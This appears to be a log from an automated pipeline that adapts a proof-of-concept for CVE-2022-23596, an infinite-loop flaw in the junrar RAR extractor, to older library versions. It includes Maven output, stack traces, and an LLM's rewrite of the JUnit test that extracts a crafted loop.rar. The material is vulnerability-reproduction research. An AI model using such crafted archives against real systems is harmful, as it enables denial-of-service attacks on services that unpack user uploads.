Running main_process.py for CVE: CVE-2022-23596
Versions: 5.0.0, 1.0.1

[1m[Main] === Starting adaptation process for CVE-2022-23596 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/com_github_junrar_junrar.txt[0m
[96m[Analyzer] com.github.junrar:junrar has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['0.7', '1.0.0', '1.0.1', '2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2022-23596[0m
[92m[Main] Total affected versions: 15[0m
[92m[Main] Already reproduced versions: 7[0m
[93m[Main] Versions pending adaptation: 8[0m
[96m[Main]     -> ['0.7', '1.0.0', '1.0.1', '2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0'][0m
[96m[Main]     -> ['6.0.0', '6.0.1', '7.0.0', '7.1.0', '7.2.0', '7.3.0', '7.4.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2022-23596 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 2.042 sec <<< FAILURE!
testCorruptHeader(edu.vision.se.Testcase1)  Time elapsed: 2.019 sec  <<< ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 2000 milliseconds
	at app//com.github.junrar.unpack.vm.RarVM.ExecuteCode(RarVM.java:348)
	at app//com.github.junrar.unpack.vm.RarVM.execute(RarVM.java:174)
	at app//com.github.junrar.unpack.Unpack.ExecuteCode(Unpack.java:989)
	at app//com.github.junrar.unpack.Unpack.UnpWriteBuf(Unpack.java:412)
	at app//com.github.junrar.unpack.Unpack.unpack29(Unpack.java:353)
	at app//com.github.junrar.unpack.Unpack.doUnpack(Unpack.java:116)
	at app//com.github.junrar.Archive.doExtractFile(Archive.java:568)
	at app//com.github.junrar.Archive.extractFile(Archive.java:514)
	at app//com.github.junrar.LocalFolderExtractor.extract(LocalFolderExtractor.java:58)
	at app//com.github.junrar.Junrar.tryToExtract(Junrar.java:155)
	at app//com.github.junrar.Junrar.extractArchiveTo(Junrar.java:123)
	at app//com.github.junrar.Junrar.extract(Junrar.java:34)
	at app//edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:19)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base@11/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base@11/java.lang.reflect.Method.invoke(Method.java:566)
	at app//org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at app//org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at app//org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at app//org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base@11/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base@11/java.lang.Thread.run(Thread.java:834)


Results :

Tests in error: 
  testCorruptHeader(edu.vision.se.Testcase1): test timed out after 2000 milliseconds

Tests run: 1, Failures: 0, Errors: 1, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.341 s
[INFO] Finished at: 2025-07-13T18:14:00Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12.4:test (default-test) on project CVE-2022-23596: There are test failures.
[ERROR] 
[ERROR] Please refer to /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.

[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 5.0.0[0m
[96m[Selector] Closest reproduced version: 6.0.0 at index 8[0m
[96m[Adapter] Trying next closest version: 5.0.0[0m
[]
[93m[Preparer] No usable exploit dirs found under /PoCAdaptation/exploit/valid/CVE-2022-23596, use source[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit[0m
[96m[Preparer] Updating dependency version to 5.0.0 in /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 5.0.0 in /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 5.0.0...[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
  symbol:   class CorruptHeaderException
  location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
  symbol:   class CorruptHeaderException
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.090 s
[INFO] Finished at: 2025-07-13T18:14:04Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 6.0.0 to 5.0.0...[0m
[96m[Adapter] Start adapting exploit from 6.0.0 to 5.0.0"[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
  symbol:   class CorruptHeaderException
  location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
  symbol:   class CorruptHeaderException
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.983 s
[INFO] Finished at: 2025-07-13T18:14:06Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class CorruptHeaderException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package com.github.junrar.exception[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class CorruptHeaderException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
---------
[LLMClient] Asking: You are given a Java error log when executing 'mvn test' in a project with dependency version 5.0.0:com.github.junrar:junrar.
This test file compiles and runs successfully with version 6.0.0.

Your task is to:
output the location in the project that should be modified to fix the problem **without updating this library**.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
  symbol:   class CorruptHeaderException
  location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
  symbol:   class CorruptHeaderException
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.983 s
[INFO] Finished at: 2025-07-13T18:14:06Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2022-23596</artifactId>
  <name>junrar CVE-2022-23596</name>

  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>

  <dependencies>
    <dependency>
      <groupId>com.github.junrar</groupId>
      <artifactId>junrar</artifactId>
      <version>5.0.0</version>
    </dependency>
    <dependency>
        <groupId>cn.hutool</groupId>
        <artifactId>hutool-all</artifactId>
        <version>5.7.10</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
---------
---------
[LLMClient] Response: test
---------
[96m[Adapter] LLM response for fix position: test[0m
[96m[Adapter] Fix position is in test code.[0m
---------
[LLMClient] Asking: You are given an error when executing exploit in in 5.0.0:com.github.junrar:junrar
This exploit file compiles and reproduced successfully in 6.0.0 with an assertion error.

Your task is fix the error.

Only output the modified version of the test file. No explanations. 
### Compilation Errors:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
  symbol:   class CorruptHeaderException
  location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
  symbol:   class CorruptHeaderException
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.983 s
[INFO] Finished at: 2025-07-13T18:14:06Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Junrar;
import org.junit.Test;
import com.github.junrar.exception.CorruptHeaderException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof CorruptHeaderException);
    }
}



---------
---------
[LLMClient] Response: Here's the modified version of the test file:

```java
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Junrar;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
```
---------
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2022-23596 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 2.021 sec <<< FAILURE!
testCorruptHeader(edu.vision.se.Testcase1)  Time elapsed: 2.017 sec  <<< ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 2000 milliseconds
	at app//com.github.junrar.unpack.vm.RarVM.ExecuteCode(RarVM.java:348)
	at app//com.github.junrar.unpack.vm.RarVM.execute(RarVM.java:174)
	at app//com.github.junrar.unpack.Unpack.ExecuteCode(Unpack.java:989)
	at app//com.github.junrar.unpack.Unpack.UnpWriteBuf(Unpack.java:412)
	at app//com.github.junrar.unpack.Unpack.unpack29(Unpack.java:353)
	at app//com.github.junrar.unpack.Unpack.doUnpack(Unpack.java:116)
	at app//com.github.junrar.Archive.doExtractFile(Archive.java:576)
	at app//com.github.junrar.Archive.extractFile(Archive.java:518)
	at app//com.github.junrar.LocalFolderExtractor.extract(LocalFolderExtractor.java:60)
	at app//com.github.junrar.Junrar.tryToExtract(Junrar.java:165)
	at app//com.github.junrar.Junrar.extractArchiveTo(Junrar.java:132)
	at app//com.github.junrar.Junrar.extract(Junrar.java:34)
	at app//edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:19)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base@11/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base@11/java.lang.reflect.Method.invoke(Method.java:566)
	at app//org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at app//org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at app//org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at app//org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base@11/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base@11/java.lang.Thread.run(Thread.java:834)


Results :

Tests in error: 
  testCorruptHeader(edu.vision.se.Testcase1): test timed out after 2000 milliseconds

Tests run: 1, Failures: 0, Errors: 1, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.506 s
